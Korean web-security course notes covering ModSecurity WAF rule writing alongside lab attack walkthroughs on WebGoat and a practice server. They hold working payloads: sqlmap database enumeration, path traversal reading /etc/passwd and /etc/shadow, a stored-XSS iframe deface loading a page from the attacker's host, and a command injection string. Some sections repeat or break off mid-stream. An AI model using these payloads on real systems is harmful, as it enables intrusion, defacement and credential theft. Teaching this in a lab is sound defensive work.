174. ModSecurity 커스텀 룰, XSS SQL Injection IP 차단 룰과 OWAS

1. Admin 차단 룰

1-1. 룰 적용

직전 시간에 작성한 Admin 페이지 차단 룰을 저장한 뒤, 환경설정 파일을 변경했으므로 모 듈과 아파치 서비스를 재시작한다.

⌘Shell
a2enmod security2
systemctl restart apache2
apache2ctl configtest

문법 검사 결과 Syntax OK 가 출력되면 정상이다.

1-2. 실시간 로그 확인
⌘Text
tail -f /var/log/apache2/modsec_audit.log
1-3. 테스트

접속한 웹서버 URL 뒤에 /login , 이어서 admin 이라는 문자열을 포함시켜 요청한다.

⌘Text
http://[웹서버 IP]/login/admin
1-4. 결과 확인

admin 이라는 문자열이 URL에 포함된 상태로 요청을 보내면, 403 Forbidden이 출력되며, 감사 로그에도 다음과 같은 내용이 기록된다.

클라이언트 IP(예: 100.110)에서 /login/admin 으로 요청이 발생했다는 내용

Access denied 및 상태 코드 403, phase:1 관련 정보

어떤 문자열( admin )이 매치되었는지에 대한 내용

매치된 룰의 파일( /etc/modsecurity/modsecurity.conf ) 및 라인 번호(241번 라인)

설정한 msg( adminisnotaccess-webpack ) 및 id 값

일반적인 상황이라면 해당 파일이나 디렉토리가 존재하지 않을 경우 403 Forbidden이 아니라 404 Not Found가 출력되어야 한다. 하지만 룰에서 액션으로 403 코드를 지정 했기 때문에 404가 아닌 403이 출력된다.

2. XSS 공격 차단

2-1. 룰 작성 위치

/etc/modsecurity/modsecurity.conf 파일의 맨 마지막, 앞서 작성한 룰 다음 줄에 새 룰을 추가한다.

2-2. 변수: ARGS

파라미터 값을 검사하기 위해 ARGS (argument, 파라미터를 나타내는 변수)를 사용한다.

2-3. 룰 작성
⌘Text
SecRule ARGS "@rx <script>" \
"id:100002,phase:2,log,deny,status:403,msg:'xss attacking'"
구성 요소 값
변수 ARGS(파라미터에 특정 태그가 포함되어 있는지
확인)
연산자 @rx (정규 표현식, Regular Expression)
id 100002
phase 2 (바디 부분 검사)
액션 log, deny, status:403
msg 'xss attacking'

이 룰은 파라미터 값에 정규 표현식을 포함하여 특정 태그가 포함되어 들어오는 XSS 공격을 차단하기 위한 룰이다.

2-4. 적용 및 테스트

저장 후 아파치를 재시작한다. (모듈은 아파치2가 재시작되면 그 안에서 함께 재시작되므로 별도 작업이 필요 없다.)

⌘Shell
systemctl restart apache2
tail -f /var/log/apache2/modsec_audit.log

웹서버에 접속하여 임의의 파라미터(예: id )에 스크립트 태그를 삽입해 테스트한다.

⌘Text
http://[웹서버 IP]/?id=<script>alert(document.cookie)</script>
2-5. 결과 확인

엔터를 입력하면 403 Forbidden 상태 코드가 반환되며, 로그 메시지에도 새로운 탐지 내용이 나타난다. 로그에는 다음 내용이 포함된다.

phase:2 관련 코드

클라이언트 IP(예: 100.91)에서 요청이 발생했다는 내용

'xss attacking' 메시지를 가진 트래픽이 발생했다는 내용

정리하면, id 라는 파라미터에 스크립트 태그를 이용한 XSS 공격을 시도했을 때 룰에 의해 접근이 차단되는 것을 로그에서 확인할 수 있다.

3. 특정 국가/대역 외 IP 차단

3-1. 변수: REMOTE_ADDR

접속하는 IP 주소를 다루기 위해서는 REMOTE_ADDR (원격 주소)라는 변수를 사용한다.

3-2. 룰 작성

192.168. 로 시작하는 주소가 아니라면 차단하고자 하는 룰이다. 부정의 의미는 느낌표( ! ) 로 표현한다.

⌘Text
SecRule REMOTE_ADDR "!^192.168." \
"id:100003,phase:1,log,deny,[상태 코드 및 메시지 등 추가 액션]"

뒤에는 동일하게 액션을 통해 원하는 동작(차단, 로그, 메시지 등)을 지정하면 된다.

4. SQL Injection(UNION SELECT) 차단

4-1. 시나리오

SQL Injection 공격 시 흔히 사용되는 OR , UNION SELECT 와 같은 명령어를 이용한 공격을 차단하는 룰을 작성한다.

4-2. 룰 작성
⌘SQL
SecRule ARGS "@contains UNION SELECT" \
"id:100004,phase:2,log,deny,status:403,msg:'SQL injection'"
구성 요소 값
변수 ARGS
연산자 @contains (UNION SELECT 문자열 포함 여부
검색)
id 100004
액션 log, deny, status:403
msg 'SQL injection'

이렇게 설정하면 로그인 폼이나 게시판, URI 등에서 UNION SELECT를 이용한 SQL Injection 공격 시도가 있을 경우 동일하게 차단이 이루어진다.

4-3. 테스트 및 예상치 못한 탐지 결과

저장 후 아파치를 재시작하고 로그를 실시간으로 확인한 상태에서, 로그인/게시판이 없는 환경이므로 URI의 파라미터( id=1 )에 작은따옴표와 UNION SELECT ... FROM ... 구문을 삽입하여 테스트한다.

테스트 결과 화면에는 404 Not Found가 출력되었으며, 로그를 확인한 결과 작성한 커스텀 룰(id 100003)이 아니라 별도의 룰에 의해 이미 탐지된 것을 확인할 수 있었다. 이는 다음 경로에 위치한 룰 파일에 의한 것이다.

⌘Text
/usr/share/modsecurity-crs/rules/
4-4. 룰 파일 확인
⌘Text
ls /usr/share/modsecurity-crs/rules/

해당 디렉토리 안에는 확장자가 .conf 로 끝나는 다수의 룰 파일이 존재하며, 파일명을 통해 어떤 공격을 막기 위한 룰인지 짐작할 수 있다.

5-2. CRS 프로젝트 및 업데이트

OWASP 사이트에서 ModSecurity Core Rule Set 프로젝트를 확인할 수 있으며, OWASP 최신 Top 10에 따라 차단 또는 탐지할 수 있는 CRS를 제공한다고 소개되어 있다. 해당 프로젝트 페이지에서 CRS 다운로드 링크와 설치 명령어(튜토리얼)를 확인할 수 있으며, 그대로 따라 하면 CRS를 추가로 설치할 수 있다.

CRS를 다운로드하고 설치하면 관리자가 일일이 커스텀 룰을 작성하지 않더라도 최신 룰을 통해 웬만한 공격을 차단 또는 탐지하도록 WAF를 운영할 수 있다. 다만 최신 CRS를 받았다고 하더라도 새롭게 나타나는 공격이나 특정 문자열을 이용한 공격은 언제든지 발생할 수 있으므로, 이러한 경우 즉시 커스텀 룰을 작성하여 WAF에 바로 적용해야 한다.

5-3. ModSecurity의 활용 범위

ModSecurity는 생각보다 많은 웹 서버에서 동작한다. 그 이유는 방화벽이나 IDS, IPS 등의 장비로 탐지하거나 차단할 수 없는 트래픽이 이를 우회하여 웹 서버까지 도달했을 때, 웹서버 단에서 직접 차단 또는 탐지를 수행할 수 있기 때문이다.

175. WAF(웹 방화벽)

네트워크 인프라 4교시 강의 교안

WAF(웹 방화벽)의 개념과 ModSecurity 설치, 룰 문법 이해

1. WAF(Web Application Firewall) 개요

1-1. WAF의 정의

WAF는 방화벽(Firewall)이다. F와 W가 각각 파이어(Fire), 월(Wall)에 해당하여 기본적으로 방화벽 역할을 하는 것을 나타낸다.

1-2. 기존 보안 장비와 WAF의 차이

이미 방화벽, IDS, IPS 등 기존 보안 장비들이 네트워크 경계망에 존재하고 있다. 일반적인 네트워크 레이어 구조는 다음과 같다.

⌘Text
외부 - 방화벽(경계망) - IDS/IPS - L3/L4 장비 - L2 장비 - 호스트/시스템

웹 서버는 이러한 구조 내부의 특정 존(zone)에 존재하게 되는데, 외부에서 방화벽과 IPS 장비를 우회하여 내부로 들어온 트래픽이 웹 서버에 도착했을 때, 애플리케이션 계층의 내용까지 룰을 이용해 탐지 또는 차단하기 위한 솔루션이 WAF이다.

WAF는 방화벽이나 IPS를 우회해서 들어오더라도 웹 서버 바로 앞단에서 실행되기 때문에, 웹 서버를 지킬 수 있는 최후의 보루가 된다.

1-3. ModSecurity와 모듈(Module)의 개념

아파치(Apache)나 엔진X(Nginx) 계열 웹 서비스에서 WAF 구축 시 가장 많이 사용하는 것이 ModSecurity이다. MOD 로 시작하거나 끝나는 것들은 모듈(Module)을 의미하며, 단 독으로 실행되는 것이 아니라 아파치(HTTPD 또는 apache2) 같은 웹 서비스에 모듈처럼 동작하는 방식이다.

1-4. OWASP CRS(Core Rule Set)

OWASP 프로젝트 안에 ModSecurity가 포함되어 있으며, 그 안에 OWASP에서 제공하는 코어 룰셋인 CRS가 존재한다. 이는 스노트(Snort)에서 snort.org가 제공하는 코어 룰셋과 유사한 개념으로, 다운로드하여 테스트할 수 있다. 본 실습에서는 우분투에 아파치2를 구동하고 ModSecurity 모듈을 설치하여 관리자가 직접 룰을 작성하는데, 이렇게 관리자가 작성하는 룰을 커스텀 룰이라고 한다.

2-1. 사전 준비

우분투 머신에서 실습을 진행하며, 필요 시 패키지 업데이트를 먼저 수행한다.

4. ModSecurity 룰(Rule) 기본 문법

4-1. 룰의 기본 구성 순서

룰의 기본 형식은 다음 순서로 구성된다.

⌘Text
SecRule [변수] "[연산자] [값]" "[액션1],[액션2],..."
구성 요소 설명
SecRule 지시자(directive). 이 문자열을 만나면 룰이 설정되어 있
음을 인식
변수(Variable) 검사 대상이 되는 값
연산자(Operator) 검사 방식을 지정
액션(Action) 조건에 일치할 때 수행할 동작

얼핏 보면 IDS나 IPS의 룰 규칙보다 복잡해 보이지만 실제로는 크게 복잡하지 않다.

4-2. 주요 변수(Variable)

변수는 모두 대문자로 표기한다.

변수 의미
ARGS GET 또는 POST로 요청되는 모든 파라미터 변수
ARGS_GET Query String에 해당하는 파라미터 변수
REQUEST_URI 전체 요청 경로(URL 주소)
REQUEST_METHOD 요청 방식
REQUEST_COOKIES 요청에 포함된 쿠키

REQUEST_URI 변수 뒤에 특정 문자열(예: login.php)을 지정하면, 전체 URL 주소에서 해당 문자열이 있는지 점검한다.

4-3. 주요 연산자(Operator)

연산자는 @ 기호 뒤에 문자열로 표기한다.

연산자 의미
@rx 정규 표현식(Regular Expression) 사용
@streq 문자열이 완전히 일치하는지 확인
@contains 문자열을 포함하고 있는지 확인
4-4. 주요 액션(Action)

액션은 콤마로 구분하여 여러 개를 순서에 상관없이 나열할 수 있다.

액션 의미
deny 요청을 즉시 차단하고 403 Forbidden 메시지 반환
status:403 반환할 HTTP 상태 코드를 403으로 지정
log 로그 메시지를 감사 기록에 남김
msg:'문자열' 룰 조건 일치 시 관리자가 알아볼 수 있는 메시지 지정 (스노트/수리카타의 MSG
와 동일한 개념)
id:번호 룰 고유 ID 지정 (스노트/수리카타와 동일하게, 커스텀 룰은 일반적으로 10만번
이상을 사용)
phase:숫자 검사 단계 지정 (아래 4-5 참고)
4-5. phase(단계) 개념

클라이언트가 서버에 페이지를 요청했을 때, HTTP 요청 헤더 값들을 프락시 툴에서 확인할 수 있는 것처럼 여러 단계에서 검사를 수행할 수 있다.

phase 값 검사 위치
phase:1 요청 헤더 단계에서 검사
phase:2 요청 바디 단계에서 검사

보통 phase:1 을 주어 헤더의 첫 번째 단계부터 바로 검사하도록 설정한다.

176. WebGoat SQL Injection 취약점

1. SQL Injection 개요

1-1. 실습 범위

WebGoat의 인젝션(Injection) 카테고리에서는 누메릭(Numeric) 기반 SQL Injection과 스트링(String) 기반 SQL Injection 문제를 다룬다. 수동 점검을 통해 전체 DB에 대한 내용이 나오는 것까지 확인한 이후, 자동화 도구인 sqlmap을 이용한 점검을 진행한다.

2. sqlmap 개요

2-1. sqlmap의 역할

수동 점검 외에 SQL Injection 취약점을 자동으로 점검할 수 있는 강력한 도구로 sqlmap이 있다. 이 도구는 터미널에서 실행하여 사용한다.

2-2. 세션 값 확인

WebGoat는 자바(Java) 기반이기 때문에 PHP 기반 애플리케이션에서 사용하던

PHPSESSID 가 아니라 JSESSIONID 라는 세션 값을 사용한다.

⌘Text
JSESSIONID=[프락시 툴에서 확인한 값]

3. sqlmap 실행 절차

3-1. 주요 옵션
옵션 의미
-u 점검 대상 URL 지정
--cookie 요청에 포함할 쿠키 값 지정(JSESSIONID 포함)
-p 점검할 특정 파라미터 지정
3-2. 대상 요청 확보

OWASP 제프락시(ZAP)에서 잡았던 히스토리 중 해당 요청(HTTP 요청부터 Submit 관련 파라미터까지)을 복사하여 sqlmap 실행 시 -u 옵션 값으로 사용한다.

⌘Text
sqlmap -u "[복사한 요청 URL 또는 파라미터 문자열]" --cookie="JSE
SSIONID=[값]" -p station

⚠️ 명령어 실행 시 큰따옴표(더블 코트)가 하나 누락되면 오류가 발생하므로, 안내 메시지에 따라 누락된 따옴표를 보완해 주어야 한다.

3-3. DB 구조 확인

파라미터에 대한 취약점 점검이 완료되면, 이어서 다음과 같은 방식으로 DB 구조를 단계적으로 확인해 나갈 수 있다.

⌘Text
sqlmap -u "[대상]" --cookie="JSESSIONID=[값]" -p station --d
bs

DB 목록을 확인한 후에는 해당 DB 이름을 지정하여 테이블 목록을, 테이블을 지정하여 컬럼(칼럼즈) 목록을 순차적으로 확인해 나가는 방식으로 전체 DB 구조를 파악할 수 있다.

2. DOM 기반 Cross Site Scripting(XSS) 실습

2-1. 문제 위치

액세스 컨트롤 플러즈 카테고리 하위의 아작스 시큐리티(AJAX Security) 항목 중 DOM-

WebGoat는 문제풀이(솔루션), 소스뿐 아니라 힌트도 함께 제공하므로, 힌트를 먼저 확인한 뒤 테스트를 진행할 수도 있다.

2-2. 1차 시도: 스크립트 태그 삽입

입력 필드가 아작스 방식으로 실시간 반영되는 것을 확인한 뒤, 스크립트 태그를 삽입해 본 다.

⌘Text
<script>alert('핵')</script>

Submit Solution을 실행해도 핵이라는 문자열이 화면에 출력되지 않는다.

2-3. 원인 분석: 인코딩 처리

입력 값을 확인해 보면, 태그를 구성하는 꺾쇠( < , > )와 큰따옴표가 점( . )으로 치환되어 있는 것을 확인할 수 있다. 즉 스크립트 태그로 삽입한 값이 일반 문자열로 인식되지 않고, 특수문자가 이스케이프 처리되고 있다는 의미이다.

⌘Text
<script>document.cookie</script>

위와 같이 document.cookie 로 변경하여 시도해도 팝업창이 뜨지 않으며, 마찬가지로 꺾쇠 기호가 점으로 치환된다.

꺾쇠 기호 뒤에 script 라는 문자열이 오는 경우에만 점으로 치환되는 것을 확인할 수 있다.

2-4. 2차 시도: img 태그를 이용한 우회

문제 설명에 따르면 특정 OWASP 이미지로 페이지를 디페이스(변조)하라는 미션이다. 스크립트 태그가 아니라 img src 태그를 이용해야 한다는 것을 알 수 있다.

⌘Text
<img src="[OWASP 이미지 경로]">

이미지가 위치한 경로를 복사하여 img src 값으로 지정하면, 이미지 태그가 실행되어 일반 문자열이 아니라 그림이 삽입되어 웹페이지가 디페이스되는 것을 확인할 수 있다.

7-1. 문제 개요

7-2. 실습 절차

버프스위트의 인터셉트를 ON으로 설정한 후 임의의 값을 입력하여 GO를 클릭하면 요청이 프락시에 잡히는 것을 확인할 수 있다. 인터셉트를 OFF로 전환하면 요청이 정상적으로 전달된다.

8. 실습: 경로 기반 접속 제어 우회(Path Traversal)

8-1. 문제 개요

접속 제어에 대한 흐름 카테고리 중 두 번째 항목인 패스 베이스드 액세스 컨트롤(Path Based

Access Control) 은 경로 기반 접속 제어를 우회하는 문제이며, 이는 경로 조작(Path Traversal)에 해당한다.

8-2. 대상 디렉토리 구조

문제 설명에 따르면 파일 위치는 다음과 같은 경로 구조를 가진다.

⌘Text
/root/(하위)/webapps/webwolf/(하위)/lessons/html 파일들

임의의 파일을 선택하여 뷰 파일을 클릭하면 "이미 허가되지 않은 파일이다"라는 메시지와 함께 다시 시도해보라는 안내가 출력된다.

8-3. 버프스위트를 이용한 파라미터 확인

인터셉트를 ON으로 설정한 후 임의의 파일을 선택하여 뷰 파일을 클릭하면 버프에 요청이 잡히며, file 파라미터에 선택한 파일명(challenge_screen.html 등)이 전달되는 것을 확인할 수 있다.

8-4. 경로 조작을 통한 파일 접근

파일이 위치한 경로까지 상위 디렉토리 수를 카운트한 결과 9개의 상위 디렉토리가 있는 것을 확인하였다. 이를 이용해 ../ 개수를 조절하며 경로를 조작한다.

⌘Text
../../../../../../../../../etc/passwd

이 값을 file 파라미터에 넣고 포워드하면, 최종적으로 /etc/passwd 파일 내용이 웹 브라우저에 노출되는 것을 확인할 수 있다.

⚠️ 경로 조작에 대한 취약점이 발생하는 이유는 파일들의 내부 위치가 세밀하게 노출되어 있고, 해당 디렉토리에 대한 접근 권한이 제대로 설정되지 않았기 때문이다.

8-5. 섀도우(Shadow) 파일 확인

같은 방식으로 file 파라미터 값을 ../../../../../../../../../etc/shadow 로 변경하여 포워드하면, 암호화된 패스워드가 저장되는 섀도우 파일의 내용을 확인할 수 있다.

⌘Text
../../../../../../../../../etc/shadow

7-2. 실습 절차

버프스위트의 인터셉트를 ON으로 설정한 후 임의의 값을 입력하여 GO를 클릭하면 요청이 프락시에 잡히는 것을 확인할 수 있다. 인터셉트를 OFF로 전환하면 요청이 정상적으로 전달된다.

8-1. 문제 개요

Access Control) 은 경로 기반 접속 제어를 우회하는 문제이며, 이는 경로 조작(Path Traversal)에 해당한다.

8-2. 대상 디렉토리 구조

문제 설명에 따르면 파일 위치는 다음과 같은 경로 구조를 가진다.

⌘Text

8-4. 경로 조작을 통한 파일 접근

파일이 위치한 경로까지 상위 디렉토리 수를 카운트한 결과 9개의 상위 디렉토리가 있는 것을 확인하였다. 이를 이용해 ../ 개수를 조절하며 경로를 조작한다.

⌘Text

⚠️ 경로 조작에 대한 취약점이 발생하는 이유는 파일들의 내부 위치가 세밀하게 노출되어 있고, 해당 디렉토리에 대한 접근 권한이 제대로 설정되지 않았기 때문이다.

179. bbs_add php의 XSS 취약점을 이용한 Deface 공격 실습

1. 게시판 XSS 취약점 확인

bbs_add.php (공지사항 글쓰기 페이지)에도 다양한 취약점이 존재하는지 ZAP 스캐닝으로 확인할 수 있으며, 실습에서는 직접 스크립트를 입력하여 테스트를 진행한다.

1-1. 기본 스크립트 삽입 테스트
⌘Text
<!-- 문서(document)의 본문(body)에 값을 쓰는지 확인하는 테스트용
스크립트 -->
<script>document.write(1)</script>

위 스크립트를 제목에 넣어 등록하고, 동일한 방식으로 문자열만 2로 바꾼 스크립트를 본문에 등록한다. 등록 후 시작 페이지("홈")에 들어가면 1과 2가 출력되는 것을 확인할 수 있으며, 이를 통해 이 페이지에 XSS 취약점이 존재함을 확인할 수 있다.

1-2. 실행 위치에 따른 차이

글쓰기(더보기) 화면에서 목록을 조회할 때는 스크립트가 실행되지 않고 문자열 그대로 (HTML 엔티티 값으로 변환되어) 표시된다.

반면 시작 페이지("홈")에서는 스크립트가 실제로 실행된다.

이는 게시글을 확인하는 페이지(더보기)에는 스크립트 태그를 문자열로 처리하는 필터링이되어 있지만, 시작 페이지에는 그러한 검증 로직이 없다는 것을 의미한다.

게시판에 저장된 형태의 XSS이므로 스토어드(Stored) XSS이며, 이는 위험도가 높은 취약점에 해당한다.

2. iframe을 이용한 Deface 시도

2-1. 공격 스크립트 구성

힌트에서 제시된 것처럼, HTML 본문에 내용을 삽입할 때는 innerHTML을 사용한다. 여기에 iframe 태그를 삽입하여 액자(프레임) 형태로 다른 페이지를 불러오도록 한다.

⌘Text
<!-- iframe의 width, height를 100%로 지정하면 웹브라우저 전체 화
면을 차지하게 됨 -->
<!-- %를 지정하지 않으면 100px과 같이 픽셀 단위로 인식됨 -->
<iframe width="100%" height="100%" src="..." scrolling="no"
frameborder="0"></iframe>

width, height에 %를 붙이지 않으면 100px처럼 픽셀 단위로 지정된다. %를 붙이면 웹브라우저에 표시되는 전체 영역을 차지하게 된다.

scrolling="no"로 지정하면 스크롤바가 표시되지 않는다.

frameborder="0"으로 지정하면 테두리가 없어진다.

2-2. 삽입할 페이지 준비

칼리에 미리 만들어 둔 hacking.html 파일을 iframe의 src로 지정한다. 이 파일은 파이썬으로 웹서버를 실행하여 제공한다.

⌘Shell
# 8000번 포트로 간단한 웹 서버 실행
python3 -m http.server 8000

최종적으로 삽입한 스크립트는 다음과 같은 형태이다.

⌘Text
<!-- 칼리 IP와 포트 지정 (예시: 192.168.100.149:800) -->
<script>document.body.innerHTML='<iframe width="100%" heigh
t="100%" src="<http://192.168.100.149:800/hacking.html>" sc
rolling="no" frameborder="0"></iframe>'</script>

이 스크립트를 제목에 입력하고 등록을 시도하면, 앞서 확인한 제목 글자 수 제한으로 인해 스크립트 전체가 잘려서 정상적으로 실행되지 않는다.

3. 입력 길이 제한 확인

3-1. 글자 수 세기

앞서 게시글 제목에서 "..."으로 잘린 사례를 확인했으므로, 실제 몇 글자까지 입력이 가능한 지 확인이 필요하다.

⌘Text
<?php
// 복사한 문자열의 길이를 확인하는 테스트 코드
echo strlen("복사한 문자열");
echo "\n";

위 코드를 실행한 결과 80글자까지 입력이 가능한 것으로 확인되었으며, 공백도 하나의 글 자로 계산된다.

3-2. 개발자 도구를 통한 확인

F12를 눌러 개발자 도구의 인스펙트(엘리먼트 찾기) 기능으로 입력창의 속성을 확인한 결과, 사이즈(길이 제한) 값이 80으로 지정되어 있는 것이 확인되었으며, 이는 PHP 코드로 확인한 글자 수와 동일하다.

개발자 도구에서 이 값을 임시로 늘려(예: 800) 긴 코드를 입력하는 방법도 있으나, 공격을 시도할 때마다 매번 값을 변경해야 하는 한계가 있다. 이에 따라 80글자 이내에서 스크립트를 어떻게 구성할지에 대한 테스트가 필요하다.

4. 짧은 스크립트로 Deface 확인

먼저 문자열만 출력하는 짧은 스크립트로 동작을 확인한다.

⌘Text
<!-- 짧은 문자열을 body에 삽입하는 테스트 -->
<script>document.body.innerHTML='defaced'</script>

이 스크립트는 80바이트 이내이므로 등록 시 잘리지 않고 정상적으로 저장된다. 시작 페이지에 접속하면 "defaced"라는 문자열이 화면 전체에 표시되는 것을 확인할 수 있다.

이 상태에서 관리자가 게시글을 수정하지 않으면, 일반 클라이언트가 웹서버에 접속했을 때 "defaced" 문자열만 출력되며 정상적인 서비스를 이용할 수 없다. 문자열 대신 이미지를 넣는 등 다양한 방식으로 시작 페이지의 얼굴을 바꿀 수 있다.

정상적인 서비스를 제대로 제공하지 못하게 한다는 점에서, Deface 공격도 하나의 도수 (서비스 거부) 공격에 해당한다.

5. 80글자 제한 우회 — 주석 처리를 이용한 명령어 분할

80글자 제한 안에서 짧은 문자열이 아닌, 실제로 필요한 긴 스크립트(예: iframe을 이용한 다른 사이트 삽입)를 등록하기 위해서는 명령어를 여러 줄로 나누어 입력하는 방법을 사용한다.

5-1. 터미널에서의 줄 연결 방식

터미널에서 여러 줄에 걸쳐 입력한 명령어들을 하나로 이어서 사용하려면 역슬래시()를 이용해 줄을 연결한다. 이렇게 하면 엔터로 나뉜 각 줄이 하나로 이어진 명령어로 인식된다.

5-2. 코드에서의 주석을 이용한 연결

동일한 원리로, 자바스크립트 코드에서 /**/ (슬래시-애스터리스크-애스터리스크-슬래시) 형태의 주석을 사용하면, 여는 부분과 닫는 부분 사이의 내용이 하나의 줄로 인식되게 만들 수 있다. 이를 이용하면 80글자 제한을 넘지 않으면서도 긴 코드를 여러 게시글에 나누어 입력한 뒤 하나로 합쳐지도록 만들 수 있다.

5-3. 세 개의 글로 나누어 입력하는 절차

전체 스크립트를 세 부분으로 나누어 세 번의 글쓰기(add)를 통해 입력한다.

순서 입력 내용(개념)
첫 번째 작성 글 스크립트 앞부분 + 여는 주석 /*
두 번째 작성 글 이어지는 내용 + 문자열 연결(+) 처리
세 번째 작성 글 마지막 부분 + 닫는 주석 */ + 스크립트 종료

게시판은 가장 마지막에 작성한 글이 목록 맨 앞(홈 화면 최상단)에 표시되는 구조이다. 따라서 실제 화면에서 스크립트가 처음부터 순서대로 실행되도록 하려면, 등록하는 순서를 다음과 같이 반대로 진행해야 한다.

  1. 스크립트의 세 번째(마지막) 부분을 가장 먼저 작성

  2. 스크립트의 두 번째 부분을 두 번째로 작성

  3. 스크립트의 첫 번째(맨 앞) 부분을 가장 마지막에 작성

이렇게 작성하면 최종적으로 홈 화면에서는 스크립트 태그가 맨 앞부터 순서대로 나타나는 형태가 된다.

5-4. 변수를 이용한 문자열 결합

코드 내에서 변수(예: vr)를 선언하여 값을 담아두고, 이후 이어지는 게시글에서 + (더하기) 를 이용해 문자열을 이어 붙이는 방식으로 구성한다. 최종적으로 완성된 스크립트에는 iframe을 이용해 다른 페이지(피싱 사이트 등)를 삽입하는 내용이 포함될 수 있다.

세 개의 글을 순서에 맞게 모두 등록한 뒤 홈 화면에 접속하면, 의도한 웹 페이지(예: iframe으로 삽입한 페이지)가 정상적으로 표시되는 것을 확인할 수 있다.

6. Deface 공격의 영향과 의미

6-1. 시작 페이지 접근 시 발생하는 현상

홈 화면이 Deface된 상태에서 일반 윈도우 클라이언트가 웹 브라우저로 정상 웹사이트에 접속하려고 시도하면, 원래의 웹 페이지 대신 Deface된 화면이 표시된다. 이 경우 클라이언트는 정상적인 웹사이트에 접속할 수 없게 된다.

6-2. 피싱과의 연계 가능성

Deface된 페이지가 피싱 사이트라고 가정하면, 사용자가 이 페이지에 로그인 정보를 입력하는 순간 계정 정보가 공격자의 웹서버로 그대로 유출된다. 예를 들어 대상이 인스타그램과 같은 서비스의 웹서버라면, 칼리에서 인스타그램 로그인 페이지와 거의 동일한 피싱 사이트를 만들어 두고 동일한 방식으로 Deface를 적용할 수 있다. 이 경우 사용자는 특별한 차이를 느끼지 못하고 정상 사이트로 인지하여 로그인을 시도하며, 그 결과 계정 정보가 유출된다.

6-3. 서비스 거부와의 관계

Deface 공격은 정상적인 서비스를 제공하지 못하게 만든다는 점에서 도수(서비스 거부) 공격과 유사한 성격을 가진다.

실습 환경의 대상 머신 IP는 100.149번으로 확인되었다.

2. 정보 수집 및 취약점 점검

통신이 정상적으로 확인되면, 대상에 대한 정보를 모르는 상태이므로 정보 수집 및 취약점 점검 단계를 진행해야 한다. 이를 위해 앱맵(nmap) 스캐닝, 디렉토리 스캐닝, 잽(ZAP) 스캐닝 등 여러 스캐너 도구를 사용하여 정보와 취약점을 점검하고, 수동으로도 취약점 유무를 테스트해야 한다.

2-1. nmap을 이용한 포트 스캐닝
⌘Shell
# 스캐닝할 대상 머신의 IP를 지정하고 모든 포트에 대해 스캐닝 진행
nmap -p- [대상 IP]

스캐닝 결과 80 포트가 열려 있는 것을 확인할 수 있으며, 결과에 OS Command Injection 이 가능하다는 내용이 함께 표시된다. 그 외 맥 주소 등의 정보도 함께 확인할 수 있다.

2-2. dirb를 이용한 디렉토리 스캐닝

80 포트가 열려 있으므로 HTTP 기준으로 테스트를 진행한다.

⌘Shell
# DIRB로 대상 시스템 주소에 대해 목록 파일을 대입하여 디렉토리/파일
확인
dirb http://[대상 IP]

스캐닝 결과 PHP Info 파일과 index 페이지(시작 페이지로 추정)가 확인되었다. PHP Info 파일은 403 Forbidden으로 확인되어 권한이 없는 것으로 판단된다.

2-3. nikto를 이용한 웹서버 스캐닝
⌘Shell
# 닉토 웹서버 스캐닝 도구, 호스트를 지정하여 실행
nikto -h [대상 IP]

닉토 실행 결과에서도 PHP Info 관련 항목이 403으로 표시되며, 그 외 육안으로 확인 가능한 다른 페이지나 디렉토리는 나타나지 않는다.

dirb, nikto 이외에도 DIRBuster, DirSearch 등 여러 가지 디렉토리 스캐닝 도구가 있다.

2-4. OWASP ZAP을 이용한 자동 스캐닝

웹서버에 아직 접속하지 않은 상태에서는 ZAP에 표시되는 내용이 없다. 오토메이트 스캔 기능을 이용하면 주소를 입력하여 바로 스캐닝을 진행할 수 있다. 이 외에도 우클릭 메뉴의 어

택(Attack) - 액티브 스캐닝 기능이 있으며, 퍼징(Fuzzing) 기능도 제공된다.

스캐닝이 완료되면 얼라트(Alert) 항목에서 XSS 리플렉티드(Reflected) 위험도 높은 취약점을 확인할 수 있으며, 끝까지 스캐닝을 진행하면 command injection과 관련된 위험도 높은 취약점(Remote OS Command Injection)도 확인할 수 있다.

ZAP 스캐닝 중 CPU 사용률이 95~100%까지 올라가며 속도가 느려지는 현상이 나타날 수 있다.

XSS Reflected 취약점의 경우, id라는 파라미터에 스크립트를 삽입하여 공격할 수 있으며, 대문자로 태그를 작성하는 예시가 제시되어 있다(소문자는 필터링되어 있는 것으로 추정).

3. Command Injection 취약점 확인 및 공격 (수동 점검)

3-1. 페이지 동작 방식 분석

앞서 확인한 index.php 페이지에는 훈련장에 대한 설명과 "더 보기" 버튼만 존재한다. 더 보기를 클릭하면 URL에 id 파라미터가 나타나며, 이는 앞서 ZAP 스캐닝에서 XSS 취약점이 있다고 나온 파라미터이다.

id 값에 스크립트 태그를 삽입하여 실행 여부를 확인한 결과, 다음과 같은 특징이 확인되었다.

페이지 하단에 뜨는 메시지에 데이터_dir.txt 가 붙는 것을 확인할 수 있다.

id 값 뒤에 입력한 값이 파일 이름이 되고, 그 뒤에 .txt 확장자가 자동으로 붙는다.

실제 존재하는 번호(예: 36번)를 입력하면 해당 텍스트 내용이 출력된다.

존재하지 않는 번호(예: 100번)를 입력하면 "100.txt 파일을 찾을 수 없다"는 메시지가 출력된다.

이 페이지는 PHP 기반으로 동작하며, 처리 로직을 역으로 추정하면 다음과 같은 형태가 된다.

⌘Shell
// 사용자가 입력한 id 값을 가져옴
$_GET['id']
// id 값에 .txt 확장자를 문자열로 이어 붙임 (php에서 .은 더하기 역
할)
$_GET['id'].".txt"
// 해당 파일을 data_dir 디렉토리에서 cat 명령어로 출력
cat data_dir/ + $_GET['id'] + ".txt"

각 id에 해당하는 유머 글은 txt 파일로 이 디렉토리 밑에 저장되어 있는 것으로 확인된다.

3-2. Command Injection 테스트

명령어 두 개 이상을 연결할 때 사용하는 세미콜론(;)을 이용하여 테스트를 진행한다.

⌘Shell
# id 파라미터에 세미콜론으로 명령어를 연결하여 삽입
id=100;cat /etc/hosts

이 경우 결과에 /etc/hosts 내용이 출력되지 않으며, id 뒤에 입력한 값 전체가 일반 문자열처럼 인지된다. 뒤에 .txt 가 붙어버리면서 명령어로 인식되지 않은 것이 원인이다.

이를 우회하기 위해, 실제 존재하는 id 값을 명령어 마지막에 배치하는 방식을 사용한다.

⌘Shell
# 마지막에 실제 조회 가능한 id 값을 배치하여 명령어가 먼저 실행되도
록 함
id=;cat /etc/passwd;cat data_dir/36

이렇게 입력하면 앞의 명령어( cat /etc/passwd )가 먼저 정상적으로 실행되고, 이후 마지막에 조회 가능한 값에 .txt 가 붙으면서 "파일을 찾을 수 없다"는 메시지가 출력되지만 실제로는 앞의 명령어가 이미 실행된 상태이다.

